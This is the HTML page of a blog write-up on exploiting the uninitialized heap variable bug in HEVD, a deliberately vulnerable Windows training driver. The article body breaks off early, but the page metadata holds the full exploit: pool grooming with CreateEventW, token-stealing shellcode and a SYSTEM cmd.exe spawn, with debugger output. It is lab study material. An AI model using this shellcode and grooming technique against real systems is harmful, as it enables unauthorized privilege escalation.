<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
  <meta name="generator" content="Jekyll">

  <title>Windows Kernel Exploitation 0x06 | Uninitialized Heap Variable [eng]</title>

  <link rel="stylesheet" href="/css/main.css">
  <!-- <link href="assets/favicon.ico" rel="icon" type="image/x-icon" /> -->
  <link rel="shortcut icon" type="image/png" href="assets//favicon.png">
  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Windows Kernel Exploitation 0x06 Uninitialized Heap Variable [eng] | Windows Internals Blog</title>
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="Windows Kernel Exploitation 0x06 Uninitialized Heap Variable [eng]" />
<meta name="author" content="truebad0ur" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="write-up write-up 2 exploit original file renamed to UninitializedMemoryPagedPool.c Now our way is Uninitialized Heap Variable bp HEVD!TriggerUninitializedHeapVariable bp HEVD!TriggerUninitializedHeapVariable+119 Simply the same idea as in the previous one, but now it’s from heap I’ll use this post to recreate the exploit in c++ and get some instructions in the process Simple pattern as in first parts: #include &lt;stdio.h&gt; #include &lt;Windows.h&gt; HANDLE hDevice; int main() { hDevice = CreateFileA(&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, NULL, NULL); printf(&quot;[+] Start to get HANDLE...\n&quot;); if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL) { return FALSE; } printf(&quot;[+] Success to get HANDLE!\n&quot;); DWORD bReturn = 0; char buf[4] = { 0xb0, 0xb0, 0xd0, 0xba }; DeviceIoControl(hDevice, 0x222033, buf, 4, NULL, 0, &amp;bReturn, NULL); return 0; } [+] Pool Tag: &#39;kcaH&#39; [+] Pool Type: PagedPool [+] Pool Size: 0xF0 [+] Pool Chunk: 0xAC085188 [+] UserValue: 0xBAD0B0B0 [+] UninitializedHeapVariable Address: 0xAB83BA98 [+] Triggering Uninitialized Heap Variable Vulnerability [+] UninitializedHeapVariable-&gt;Value: 0xBAD0B0B0 [+] UninitializedHeapVariable-&gt;Callback: 0x905ACD58 kd&gt; u 0x905ACD58 905acd58 688ad95a90 push offset HEVD! ?? ::NNGAKEGL::`string&#39; (905ad98a) 905acd5d e8a4c2ffff call HEVD!DbgPrint (905a9006) 905acd62 59 pop ecx Everything is okay, our template is ready Let’s provide anything except for 0xBAD0B0B0 value: [+] Pool Tag: &#39;kcaH&#39; [+] Pool Type: PagedPool [+] Pool Size: 0xF0 [+] Pool Chunk: 0x8CD65960 [+] UserValue: 0x41414141 [+] UninitializedHeapVariable Address: 0xAB96DA98 [+] Triggering Uninitialized Heap Variable Vulnerability [+] UninitializedHeapVariable-&gt;Value: 0x00000000 [+] UninitializedHeapVariable-&gt;Callback: 0x557BBF9D [-] Exception Code: 0xC0000005 Looks like the same previous post about Pool Feng-Shui where we used CreateEvent’s Most important thing to note here is that even though the event object itself is allocated to Non-Paged Pool, the last parameter, lpName of type LPCTSTR is actually allocated on the Paged Pool. And we can actually define what it contains and its length. Important moments to notice: We’d be grooming the Lookaside list, which are lazy activated only two minutes after the boot. Maximum Blocksize for Lookaside list is 0x20, and it only manages upto 256 chunks, after that, any additional chunks are managed by the ListHead. We need to allocate 256 objects of same size and then freeing them. If the list is not populated, then the allocation would come from ListHead list. We need to make sure that the string for the object name is random for each call to object constructor, as if same string is passed to consecutive calls to object constructor, then only one Pool chuck will be served for all further requests. We also need to make sure that our lpName shouldn’t contain any NULL characters, as that would change the length of the lpName, and the exploit would fail. (important, here VirtualAlloc wouldn’t work) We’d be giving lpName a size of 0xF0, the header size would be 0x8, total 0xF8 chunks. The shellcode we’d borrow from our previous tutorial Thanks Thunder_J for his code [+] Pool Tag: &#39;kcaH&#39; [+] Pool Type: PagedPool [+] Pool Size: 0xF0 [+] Pool Chunk: 0xAE8BCD40 [+] UserValue: 0x41414141 [+] UninitializedHeapVariable Address: 0x8FBD5A98 [+] Triggering Uninitialized Heap Variable Vulnerability [+] UninitializedHeapVariable-&gt;Value: 0x00000000 [+] UninitializedHeapVariable-&gt;Callback: 0x0015F990 kd&gt; !pool 0xAE8BCD40 Pool page ae8bcd40 region is Unknown ae8bc000 size: 30 previous size: 0 (Allocated) CMVa ae8bc030 size: 8 previous size: 30 (Free) SeAt ... ae8bc7c8 size: 570 previous size: 128 (Allocated) Toke (Protected) *ae8bcd38 size: f8 previous size: 570 (Allocated) *Hack Owning component : Unknown (update pooltag.txt) kd&gt; dd ae8bcd38 ReadVirtual: ae8bcd38 not properly sign extended ae8bcd38 061f02ae 6b636148 00000000 0015f990 ae8bcd48 41414141 41414141 41414141 41414141 ae8bcd58 41414141 41414141 41414141 41414141 ae8bcd68 41414141 41414141 41414141 41414141 ae8bcd78 41414141 41414141 41414141 41414141 ae8bcd88 41414141 41414141 41414141 41414141 ae8bcd98 41414141 41414141 41414141 41414141 ae8bcda8 41414141 41414141 41414141 41414141 kd&gt; u 0015f990 0015f990 60 pushad 0015f991 64a124010000 mov eax,dword ptr fs:[00000124h] 0015f997 8b4050 mov eax,dword ptr [eax+50h] 0015f99a 89c1 mov ecx,eax 0015f99c 8b98f8000000 mov ebx,dword ptr [eax+0F8h] #include &lt;stdio.h&gt; #include &lt;Windows.h&gt; HANDLE hDevice = NULL; static VOID CreateCmd() { STARTUPINFO si = { sizeof(si) }; PROCESS_INFORMATION pi = { 0 }; si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_SHOW; WCHAR wzFilePath[MAX_PATH] = { L&quot;cmd.exe&quot; }; BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&amp;si, &amp;pi); if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess); } int main() { // Get HANDLE hDevice = CreateFileA(&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, NULL, NULL); printf(&quot;[+]Start to get HANDLE...\n&quot;); if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL) { printf(&quot;[-]Failed to get HANDLE!\n&quot;); exit(0); } printf(&quot;[+]Success to get HANDLE!\n&quot;); HANDLE Event_OBJECT[0x1000]; char Shellcode[] = ( &quot;\x60&quot; &quot;\x64\xA1\x24\x01\x00\x00&quot; &quot;\x8B\x40\x50&quot; &quot;\x89\xC1&quot; &quot;\x8B\x98\xF8\x00\x00\x00&quot; &quot;\xBA\x04\x00\x00\x00&quot; &quot;\x8B\x80\xB8\x00\x00\x00&quot; &quot;\x2D\xB8\x00\x00\x00&quot; &quot;\x39\x90\xB4\x00\x00\x00&quot; &quot;\x75\xED&quot; &quot;\x8B\x90\xF8\x00\x00\x00&quot; &quot;\x89\x91\xF8\x00\x00\x00&quot; &quot;\x61&quot; &quot;\xC3&quot; ); //LPVOID Shellcode_Addr = VirtualAlloc(NULL, // sizeof(Shellcode), // MEM_COMMIT | MEM_RESERVE, // PAGE_EXECUTE_READWRITE); //memcpy(Shellcode_Addr, Shellcode, sizeof(Shellcode)); DWORD bReturn = 0; char lpName[0xf0] = { 0 }; char buf[4] = { 0x41, 0x41, 0x41, 0x41 }; memset(lpName, 0x41, 0xf0); printf(&quot;lpName is in 0x%p\n&quot;, lpName); for (int i = 0; i &lt; 256; i++) { *(PDWORD)(lpName + 0x4) = (DWORD)&amp;Shellcode; *(PDWORD)(lpName + 0xf0 - 4) = 0; *(PDWORD)(lpName + 0xf0 - 3) = 0; *(PDWORD)(lpName + 0xf0 - 2) = 0; *(PDWORD)(lpName + 0xf0 - 1) = i; Event_OBJECT[i] = CreateEventW(NULL, FALSE, FALSE, (LPCWSTR)lpName); } for (int i = 0; i &lt; 256; i++) { CloseHandle(Event_OBJECT[i]); i += 4; } DeviceIoControl(hDevice, 0x222033, buf, 4, NULL, 0, &amp;bReturn, NULL); //__debugbreak(); printf(&quot;[+]Start to Create cmd...\n&quot;); CreateCmd(); system(&quot;pause&quot;); return 0; }" />
<meta property="og:description" content="write-up write-up 2 exploit original file renamed to UninitializedMemoryPagedPool.c Now our way is Uninitialized Heap Variable bp HEVD!TriggerUninitializedHeapVariable bp HEVD!TriggerUninitializedHeapVariable+119 Simply the same idea as in the previous one, but now it’s from heap I’ll use this post to recreate the exploit in c++ and get some instructions in the process Simple pattern as in first parts: #include &lt;stdio.h&gt; #include &lt;Windows.h&gt; HANDLE hDevice; int main() { hDevice = CreateFileA(&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, NULL, NULL); printf(&quot;[+] Start to get HANDLE...\n&quot;); if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL) { return FALSE; } printf(&quot;[+] Success to get HANDLE!\n&quot;); DWORD bReturn = 0; char buf[4] = { 0xb0, 0xb0, 0xd0, 0xba }; DeviceIoControl(hDevice, 0x222033, buf, 4, NULL, 0, &amp;bReturn, NULL); return 0; } [+] Pool Tag: &#39;kcaH&#39; [+] Pool Type: PagedPool [+] Pool Size: 0xF0 [+] Pool Chunk: 0xAC085188 [+] UserValue: 0xBAD0B0B0 [+] UninitializedHeapVariable Address: 0xAB83BA98 [+] Triggering Uninitialized Heap Variable Vulnerability [+] UninitializedHeapVariable-&gt;Value: 0xBAD0B0B0 [+] UninitializedHeapVariable-&gt;Callback: 0x905ACD58 kd&gt; u 0x905ACD58 905acd58 688ad95a90 push offset HEVD! ?? ::NNGAKEGL::`string&#39; (905ad98a) 905acd5d e8a4c2ffff call HEVD!DbgPrint (905a9006) 905acd62 59 pop ecx Everything is okay, our template is ready Let’s provide anything except for 0xBAD0B0B0 value: [+] Pool Tag: &#39;kcaH&#39; [+] Pool Type: PagedPool [+] Pool Size: 0xF0 [+] Pool Chunk: 0x8CD65960 [+] UserValue: 0x41414141 [+] UninitializedHeapVariable Address: 0xAB96DA98 [+] Triggering Uninitialized Heap Variable Vulnerability [+] UninitializedHeapVariable-&gt;Value: 0x00000000 [+] UninitializedHeapVariable-&gt;Callback: 0x557BBF9D [-] Exception Code: 0xC0000005 Looks like the same previous post about Pool Feng-Shui where we used CreateEvent’s Most important thing to note here is that even though the event object itself is allocated to Non-Paged Pool, the last parameter, lpName of type LPCTSTR is actually allocated on the Paged Pool. And we can actually define what it contains and its length. Important moments to notice: We’d be grooming the Lookaside list, which are lazy activated only two minutes after the boot. Maximum Blocksize for Lookaside list is 0x20, and it only manages upto 256 chunks, after that, any additional chunks are managed by the ListHead. We need to allocate 256 objects of same size and then freeing them. If the list is not populated, then the allocation would come from ListHead list. We need to make sure that the string for the object name is random for each call to object constructor, as if same string is passed to consecutive calls to object constructor, then only one Pool chuck will be served for all further requests. We also need to make sure that our lpName shouldn’t contain any NULL characters, as that would change the length of the lpName, and the exploit would fail. (important, here VirtualAlloc wouldn’t work) We’d be giving lpName a size of 0xF0, the header size would be 0x8, total 0xF8 chunks. The shellcode we’d borrow from our previous tutorial Thanks Thunder_J for his code [+] Pool Tag: &#39;kcaH&#39; [+] Pool Type: PagedPool [+] Pool Size: 0xF0 [+] Pool Chunk: 0xAE8BCD40 [+] UserValue: 0x41414141 [+] UninitializedHeapVariable Address: 0x8FBD5A98 [+] Triggering Uninitialized Heap Variable Vulnerability [+] UninitializedHeapVariable-&gt;Value: 0x00000000 [+] UninitializedHeapVariable-&gt;Callback: 0x0015F990 kd&gt; !pool 0xAE8BCD40 Pool page ae8bcd40 region is Unknown ae8bc000 size: 30 previous size: 0 (Allocated) CMVa ae8bc030 size: 8 previous size: 30 (Free) SeAt ... ae8bc7c8 size: 570 previous size: 128 (Allocated) Toke (Protected) *ae8bcd38 size: f8 previous size: 570 (Allocated) *Hack Owning component : Unknown (update pooltag.txt) kd&gt; dd ae8bcd38 ReadVirtual: ae8bcd38 not properly sign extended ae8bcd38 061f02ae 6b636148 00000000 0015f990 ae8bcd48 41414141 41414141 41414141 41414141 ae8bcd58 41414141 41414141 41414141 41414141 ae8bcd68 41414141 41414141 41414141 41414141 ae8bcd78 41414141 41414141 41414141 41414141 ae8bcd88 41414141 41414141 41414141 41414141 ae8bcd98 41414141 41414141 41414141 41414141 ae8bcda8 41414141 41414141 41414141 41414141 kd&gt; u 0015f990 0015f990 60 pushad 0015f991 64a124010000 mov eax,dword ptr fs:[00000124h] 0015f997 8b4050 mov eax,dword ptr [eax+50h] 0015f99a 89c1 mov ecx,eax 0015f99c 8b98f8000000 mov ebx,dword ptr [eax+0F8h] #include &lt;stdio.h&gt; #include &lt;Windows.h&gt; HANDLE hDevice = NULL; static VOID CreateCmd() { STARTUPINFO si = { sizeof(si) }; PROCESS_INFORMATION pi = { 0 }; si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_SHOW; WCHAR wzFilePath[MAX_PATH] = { L&quot;cmd.exe&quot; }; BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&amp;si, &amp;pi); if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess); } int main() { // Get HANDLE hDevice = CreateFileA(&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, NULL, NULL); printf(&quot;[+]Start to get HANDLE...\n&quot;); if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL) { printf(&quot;[-]Failed to get HANDLE!\n&quot;); exit(0); } printf(&quot;[+]Success to get HANDLE!\n&quot;); HANDLE Event_OBJECT[0x1000]; char Shellcode[] = ( &quot;\x60&quot; &quot;\x64\xA1\x24\x01\x00\x00&quot; &quot;\x8B\x40\x50&quot; &quot;\x89\xC1&quot; &quot;\x8B\x98\xF8\x00\x00\x00&quot; &quot;\xBA\x04\x00\x00\x00&quot; &quot;\x8B\x80\xB8\x00\x00\x00&quot; &quot;\x2D\xB8\x00\x00\x00&quot; &quot;\x39\x90\xB4\x00\x00\x00&quot; &quot;\x75\xED&quot; &quot;\x8B\x90\xF8\x00\x00\x00&quot; &quot;\x89\x91\xF8\x00\x00\x00&quot; &quot;\x61&quot; &quot;\xC3&quot; ); //LPVOID Shellcode_Addr = VirtualAlloc(NULL, // sizeof(Shellcode), // MEM_COMMIT | MEM_RESERVE, // PAGE_EXECUTE_READWRITE); //memcpy(Shellcode_Addr, Shellcode, sizeof(Shellcode)); DWORD bReturn = 0; char lpName[0xf0] = { 0 }; char buf[4] = { 0x41, 0x41, 0x41, 0x41 }; memset(lpName, 0x41, 0xf0); printf(&quot;lpName is in 0x%p\n&quot;, lpName); for (int i = 0; i &lt; 256; i++) { *(PDWORD)(lpName + 0x4) = (DWORD)&amp;Shellcode; *(PDWORD)(lpName + 0xf0 - 4) = 0; *(PDWORD)(lpName + 0xf0 - 3) = 0; *(PDWORD)(lpName + 0xf0 - 2) = 0; *(PDWORD)(lpName + 0xf0 - 1) = i; Event_OBJECT[i] = CreateEventW(NULL, FALSE, FALSE, (LPCWSTR)lpName); } for (int i = 0; i &lt; 256; i++) { CloseHandle(Event_OBJECT[i]); i += 4; } DeviceIoControl(hDevice, 0x222033, buf, 4, NULL, 0, &amp;bReturn, NULL); //__debugbreak(); printf(&quot;[+]Start to Create cmd...\n&quot;); CreateCmd(); system(&quot;pause&quot;); return 0; }" />
<meta property="og:site_name" content="Windows Internals Blog" />
<meta property="og:image" content="/assets/previews/16.jpg" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-11-19T00:00:00+00:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="/assets/previews/16.jpg" />
<meta property="twitter:title" content="Windows Kernel Exploitation 0x06 Uninitialized Heap Variable [eng]" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"truebad0ur"},"dateModified":"2022-11-19T00:00:00+00:00","datePublished":"2022-11-19T00:00:00+00:00","description":"write-up write-up 2 exploit original file renamed to UninitializedMemoryPagedPool.c Now our way is Uninitialized Heap Variable bp HEVD!TriggerUninitializedHeapVariable bp HEVD!TriggerUninitializedHeapVariable+119 Simply the same idea as in the previous one, but now it’s from heap I’ll use this post to recreate the exploit in c++ and get some instructions in the process Simple pattern as in first parts: #include &lt;stdio.h&gt; #include &lt;Windows.h&gt; HANDLE hDevice; int main() { hDevice = CreateFileA(&quot;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver&quot;, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, NULL, NULL); printf(&quot;[+] Start to get HANDLE...\\n&quot;); if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL) { return FALSE; } printf(&quot;[+] Success to get HANDLE!\\n&quot;); DWORD bReturn = 0; char buf[4] = { 0xb0, 0xb0, 0xd0, 0xba }; DeviceIoControl(hDevice, 0x222033, buf, 4, NULL, 0, &amp;bReturn, NULL); return 0; } [+] Pool Tag: &#39;kcaH&#39; [+] Pool Type: PagedPool [+] Pool Size: 0xF0 [+] Pool Chunk: 0xAC085188 [+] UserValue: 0xBAD0B0B0 [+] UninitializedHeapVariable Address: 0xAB83BA98 [+] Triggering Uninitialized Heap Variable Vulnerability [+] UninitializedHeapVariable-&gt;Value: 0xBAD0B0B0 [+] UninitializedHeapVariable-&gt;Callback: 0x905ACD58 kd&gt; u 0x905ACD58 905acd58 688ad95a90 push offset HEVD! ?? ::NNGAKEGL::`string&#39; (905ad98a) 905acd5d e8a4c2ffff call HEVD!DbgPrint (905a9006) 905acd62 59 pop ecx Everything is okay, our template is ready Let’s provide anything except for 0xBAD0B0B0 value: [+] Pool Tag: &#39;kcaH&#39; [+] Pool Type: PagedPool [+] Pool Size: 0xF0 [+] Pool Chunk: 0x8CD65960 [+] UserValue: 0x41414141 [+] UninitializedHeapVariable Address: 0xAB96DA98 [+] Triggering Uninitialized Heap Variable Vulnerability [+] UninitializedHeapVariable-&gt;Value: 0x00000000 [+] UninitializedHeapVariable-&gt;Callback: 0x557BBF9D [-] Exception Code: 0xC0000005 Looks like the same previous post about Pool Feng-Shui where we used CreateEvent’s Most important thing to note here is that even though the event object itself is allocated to Non-Paged Pool, the last parameter, lpName of type LPCTSTR is actually allocated on the Paged Pool. And we can actually define what it contains and its length. Important moments to notice: We’d be grooming the Lookaside list, which are lazy activated only two minutes after the boot. Maximum Blocksize for Lookaside list is 0x20, and it only manages upto 256 chunks, after that, any additional chunks are managed by the ListHead. We need to allocate 256 objects of same size and then freeing them. If the list is not populated, then the allocation would come from ListHead list. We need to make sure that the string for the object name is random for each call to object constructor, as if same string is passed to consecutive calls to object constructor, then only one Pool chuck will be served for all further requests. We also need to make sure that our lpName shouldn’t contain any NULL characters, as that would change the length of the lpName, and the exploit would fail. (important, here VirtualAlloc wouldn’t work) We’d be giving lpName a size of 0xF0, the header size would be 0x8, total 0xF8 chunks. The shellcode we’d borrow from our previous tutorial Thanks Thunder_J for his code [+] Pool Tag: &#39;kcaH&#39; [+] Pool Type: PagedPool [+] Pool Size: 0xF0 [+] Pool Chunk: 0xAE8BCD40 [+] UserValue: 0x41414141 [+] UninitializedHeapVariable Address: 0x8FBD5A98 [+] Triggering Uninitialized Heap Variable Vulnerability [+] UninitializedHeapVariable-&gt;Value: 0x00000000 [+] UninitializedHeapVariable-&gt;Callback: 0x0015F990 kd&gt; !pool 0xAE8BCD40 Pool page ae8bcd40 region is Unknown ae8bc000 size: 30 previous size: 0 (Allocated) CMVa ae8bc030 size: 8 previous size: 30 (Free) SeAt ... ae8bc7c8 size: 570 previous size: 128 (Allocated) Toke (Protected) *ae8bcd38 size: f8 previous size: 570 (Allocated) *Hack Owning component : Unknown (update pooltag.txt) kd&gt; dd ae8bcd38 ReadVirtual: ae8bcd38 not properly sign extended ae8bcd38 061f02ae 6b636148 00000000 0015f990 ae8bcd48 41414141 41414141 41414141 41414141 ae8bcd58 41414141 41414141 41414141 41414141 ae8bcd68 41414141 41414141 41414141 41414141 ae8bcd78 41414141 41414141 41414141 41414141 ae8bcd88 41414141 41414141 41414141 41414141 ae8bcd98 41414141 41414141 41414141 41414141 ae8bcda8 41414141 41414141 41414141 41414141 kd&gt; u 0015f990 0015f990 60 pushad 0015f991 64a124010000 mov eax,dword ptr fs:[00000124h] 0015f997 8b4050 mov eax,dword ptr [eax+50h] 0015f99a 89c1 mov ecx,eax 0015f99c 8b98f8000000 mov ebx,dword ptr [eax+0F8h] #include &lt;stdio.h&gt; #include &lt;Windows.h&gt; HANDLE hDevice = NULL; static VOID CreateCmd() { STARTUPINFO si = { sizeof(si) }; PROCESS_INFORMATION pi = { 0 }; si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_SHOW; WCHAR wzFilePath[MAX_PATH] = { L&quot;cmd.exe&quot; }; BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&amp;si, &amp;pi); if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess); } int main() { // Get HANDLE hDevice = CreateFileA(&quot;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver&quot;, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, NULL, NULL); printf(&quot;[+]Start to get HANDLE...\\n&quot;); if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL) { printf(&quot;[-]Failed to get HANDLE!\\n&quot;); exit(0); } printf(&quot;[+]Success to get HANDLE!\\n&quot;); HANDLE Event_OBJECT[0x1000]; char Shellcode[] = ( &quot;\\x60&quot; &quot;\\x64\\xA1\\x24\\x01\\x00\\x00&quot; &quot;\\x8B\\x40\\x50&quot; &quot;\\x89\\xC1&quot; &quot;\\x8B\\x98\\xF8\\x00\\x00\\x00&quot; &quot;\\xBA\\x04\\x00\\x00\\x00&quot; &quot;\\x8B\\x80\\xB8\\x00\\x00\\x00&quot; &quot;\\x2D\\xB8\\x00\\x00\\x00&quot; &quot;\\x39\\x90\\xB4\\x00\\x00\\x00&quot; &quot;\\x75\\xED&quot; &quot;\\x8B\\x90\\xF8\\x00\\x00\\x00&quot; &quot;\\x89\\x91\\xF8\\x00\\x00\\x00&quot; &quot;\\x61&quot; &quot;\\xC3&quot; ); //LPVOID Shellcode_Addr = VirtualAlloc(NULL, // sizeof(Shellcode), // MEM_COMMIT | MEM_RESERVE, // PAGE_EXECUTE_READWRITE); //memcpy(Shellcode_Addr, Shellcode, sizeof(Shellcode)); DWORD bReturn = 0; char lpName[0xf0] = { 0 }; char buf[4] = { 0x41, 0x41, 0x41, 0x41 }; memset(lpName, 0x41, 0xf0); printf(&quot;lpName is in 0x%p\\n&quot;, lpName); for (int i = 0; i &lt; 256; i++) { *(PDWORD)(lpName + 0x4) = (DWORD)&amp;Shellcode; *(PDWORD)(lpName + 0xf0 - 4) = 0; *(PDWORD)(lpName + 0xf0 - 3) = 0; *(PDWORD)(lpName + 0xf0 - 2) = 0; *(PDWORD)(lpName + 0xf0 - 1) = i; Event_OBJECT[i] = CreateEventW(NULL, FALSE, FALSE, (LPCWSTR)lpName); } for (int i = 0; i &lt; 256; i++) { CloseHandle(Event_OBJECT[i]); i += 4; } DeviceIoControl(hDevice, 0x222033, buf, 4, NULL, 0, &amp;bReturn, NULL); //__debugbreak(); printf(&quot;[+]Start to Create cmd...\\n&quot;); CreateCmd(); system(&quot;pause&quot;); return 0; }","headline":"Windows Kernel Exploitation 0x06 Uninitialized Heap Variable [eng]","image":"/assets/previews/16.jpg","mainEntityOfPage":{"@type":"WebPage","@id":"/2022/11/19/Windows-Kernel-Exploitation-0x06.html"},"url":"/2022/11/19/Windows-Kernel-Exploitation-0x06.html"}</script>
<!-- End Jekyll SEO tag -->

</head>

<link href="assets/favicon.ico" rel="icon" type="image/x-icon" />

<body>
  <div id="wrapper">
    <header>
  <div>
    <a href="/">
    <link rel="shortcut icon" href="/assets/favicon.ico">
    
    <h1>truebad0ur@home:~$</h1>
    </a>
    <div class="header-links">
      <a href="/archive.html"><h2 class="header-link">Archive</h2></a>
<a href="/about.html"><h2 class="header-link">About</h2></a>
<a href="/ToDo.html"><h2 class="header-link">ToDo</h2></a>
<a href="/Certificates.html"><h2 class="header-link">Certificates</h2></a>
<!--<a href="https://t.me/reverse_dungeon"><h2 class="header-link">Telegram</h2></a>-->

    </div>
  </div>
</header>

    <div class="container">
      <section id="main_content">
        <article>
  <p><a href="https://rootkits.xyz/blog/2018/03/kernel-uninitialized-heap-variable/">write-up</a></p>

<p><a href="https://dokydoky.tistory.com/445">write-up 2</a></p>

<p><a href="https://github.com/ThunderJie/Windows-Kernel-Exploit/blob/master/HEVD/Uninitialized-Heap-Variable/UninitializedHeapVariable/UninitializedHeapVariable.c">exploit</a></p>

<p><a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/UninitializedMemoryPagedPool.c">original file renamed to UninitializedMemoryPagedPool.c</a></p>

<h2 id="now-our-way-is-uninitialized-heap-variable"><a href="#header-2"></a>Now our way is Uninitialized Heap Variable</h2>

<ul>
  <li>
    <ul>
      <li>bp HEVD!TriggerUninitializedHeapVariable</li>
    </ul>
  </li>
  <li>
    <ul>
      <li>bp HEVD!TriggerUninitializedHeapVariable+119</li>
    </ul>
  </li>
</ul>

<p>Simply the same idea as in the previous one, but now it’s from heap</p>

<p>I’ll use <a href="https://dl.packetstormsecurity.net/papers/general/windows-kernel-exploitation-tutorial-part-7-uninitialized-heap-variable.pdf">this</a> post to recreate the exploit in c++ and get some instructions in the process</p>

<p>Simple pattern as in first parts:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
</span>
<span class="n">HANDLE</span> <span class="n">hDevice</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>

  <span class="n">hDevice</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span><span class="s">"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver"</span><span class="p">,</span>
    <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span>
    <span class="n">OPEN_EXISTING</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">);</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Start to get HANDLE...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span> <span class="o">||</span> <span class="n">hDevice</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
  <span class="p">{</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Success to get HANDLE!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

  <span class="n">DWORD</span> <span class="n">bReturn</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0xba</span> <span class="p">};</span>

  <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="mh">0x222033</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bReturn</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Pool</span> <span class="nx">Tag</span><span class="p">:</span> <span class="dl">'</span><span class="s1">kcaH</span><span class="dl">'</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Pool</span> <span class="nx">Type</span><span class="p">:</span> <span class="nx">PagedPool</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Pool</span> <span class="nx">Size</span><span class="p">:</span> <span class="mh">0xF0</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Pool</span> <span class="nx">Chunk</span><span class="p">:</span> <span class="mh">0xAC085188</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">UserValue</span><span class="p">:</span> <span class="mh">0xBAD0B0B0</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">UninitializedHeapVariable</span> <span class="nx">Address</span><span class="p">:</span> <span class="mh">0xAB83BA98</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Triggering</span> <span class="nx">Uninitialized</span> <span class="nx">Heap</span> <span class="nx">Variable</span> <span class="nx">Vulnerability</span>
